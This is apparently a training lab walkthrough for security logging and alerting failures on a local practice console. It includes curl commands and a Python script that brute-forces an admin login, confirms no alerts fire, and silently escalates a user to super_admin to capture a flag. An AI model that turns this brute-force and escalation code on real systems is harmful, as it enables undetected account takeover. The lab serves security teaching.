# Practical Walkthrough: Exploitation & Verification (A09)

This guide walks you through detecting, demonstrating, and verifying Security Logging & Alerting Failures on the **Zitera SOC Audit & Telemetry Console (Port 8019)**. You will execute unmonitored credential brute-force attacks, perform stealth administrative privilege escalation, and audit telemetry system states.

---

## 4-Tier Mission Progression Methodology

```
[Tier 1: Observation (15%)] ──> [Tier 2: Fault Injection (25%)] ──> [Tier 3: Weaponization (35%)] ──> [Tier 4: Verification (25%)]
   Inspect Telemetry Stream       Execute Unlogged Credential        Execute Silent Privilege           Verify Lab Target &
      & Alert Counter Baseline             Probing                          Escalation                    Reset Audit State
```

---

## Tier 1: Observation & Attack Surface Mapping (15%)

Begin by establishing the baseline telemetry status on the SOC gateway.

### 1.1 Service Health Probe (Manual cURL)
Query the service health probe endpoint:

```bash
curl -i -s http://localhost:8019/health
```

Expected response:
```json
{"status": "ok", "lab": "A09", "port": 8019}
```

### 1.2 Inspect Initial Audit Stream (Manual cURL)
Query the audit log telemetry endpoint:

```bash
curl -i -s http://localhost:8019/api/audit/logs
```

Expected response showing zero active alerts:
```json
{
  "logs": [],
  "alerts_fired": 0
}
```
Notice that `alerts_fired` is initialized to `0`.

---

## Tier 2: Fault Injection & Anomaly Testing (25%)

Now, test whether multiple failed authentication attempts generate audit log entries or raise security alarms.

### 2.1 Transmit Repeated Failed Login Attempts (Manual cURL)
Send deliberate incorrect password guesses to `/api/auth/login`:

```bash
curl -i -X POST http://localhost:8019/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": "wrong_password_1"}'
```

The server returns `HTTP/1.0 401 Unauthorized`:
```json
{"error": "Invalid credentials", "attempt": 1}
```

Send subsequent failed attempts:
```bash
curl -s -X POST http://localhost:8019/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": "wrong_password_2"}'

curl -s -X POST http://localhost:8019/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin", "password": "wrong_password_3"}'
```

### 2.2 Telemetry Stream Inspection
Query the audit log stream again to verify detection coverage:

```bash
curl -s http://localhost:8019/api/audit/logs
```

Output:
```json
{
  "logs": [],
  "alerts_fired": 0
}
```

The system completely failed to log failed authentication attempts and fired zero alerts, confirming a critical telemetry blind spot.

---

## Tier 3: Weaponization & Silent Escalation (35%)

The target objective requires generating at least 5 failed logins followed by a silent privilege escalation via `/api/admin/role_escalate`.

### 3.1 Automated Exploitation Script (`exploit_blindspot.py`)

Create and execute the following Python automation script:

```python
import json
import urllib.request

BASE_URL = "http://localhost:8019"

print("[*] Stage A: Delivering 5 brute-force credential attempts...")
for i in range(1, 6):
    payload = {"username": "admin", "password": f"guessing_attempt_{i}"}
    req = urllib.request.Request(
        f"{BASE_URL}/api/auth/login",
        data=json.dumps(payload).encode("utf-8"),
        headers={"Content-Type": "application/json"},
        method="POST"
    )
    try:
        urllib.request.urlopen(req)
    except urllib.error.HTTPError as e:
        body = json.loads(e.read().decode("utf-8"))
        print(f"    [-] Attempt {i}: HTTP {e.code} - {body.get('error')}")

print("\n[*] Stage B: Checking SOC alert stream...")
with urllib.request.urlopen(f"{BASE_URL}/api/audit/logs") as resp:
    audit_data = json.loads(resp.read().decode("utf-8"))
    print(f"    [!] Alerts Fired: {audit_data.get('alerts_fired')} (System remains totally blind!)")
    print(f"    [!] Recorded Logs: {len(audit_data.get('logs'))}")

print("\n[*] Stage C: Executing silent privilege escalation...")
escalate_payload = {
    "user": "adversary_agent",
    "role": "super_admin"
}
req = urllib.request.Request(
    f"{BASE_URL}/api/admin/role_escalate",
    data=json.dumps(escalate_payload).encode("utf-8"),
    headers={"Content-Type": "application/json"},
    method="POST"
)

with urllib.request.urlopen(req) as resp:
    result = json.loads(resp.read().decode("utf-8"))
    print("[+] Escalation Response:", json.dumps(result, indent=2))
    if "flag" in result:
        print("\n[+] Challenge Flag Successfully Captured!")
        print("[+] Flag:", result["flag"])
```

Run the script:
```bash
python exploit_blindspot.py
```

The gateway completes the unlogged privilege elevation and returns the proof-of-compromise challenge flag (`ZITERA{...}`).

---

## Tier 4: Verification & Defensive State Audit (25%)

### 4.1 Automated Lab Target Verification
Verify mission fulfillment using the practice verification endpoint:

```bash
curl -s http://localhost:8019/practice/verify
```

Expected verification response:
```json
{
  "status": "passed",
  "message": "Security logging & alerting failure reproduced: 5 brute-force attacks and 1 silent privilege escalation triggered zero SOC alerts!"
}
```

### 4.2 Reset Telemetry State
Reset server memory to clean baseline conditions:

```bash
curl -X POST http://localhost:8019/api/reset
```

Confirm reset state:
```bash
curl -s http://localhost:8019/api/audit/logs
```
The response should confirm `{"logs": [], "alerts_fired": 0}`.
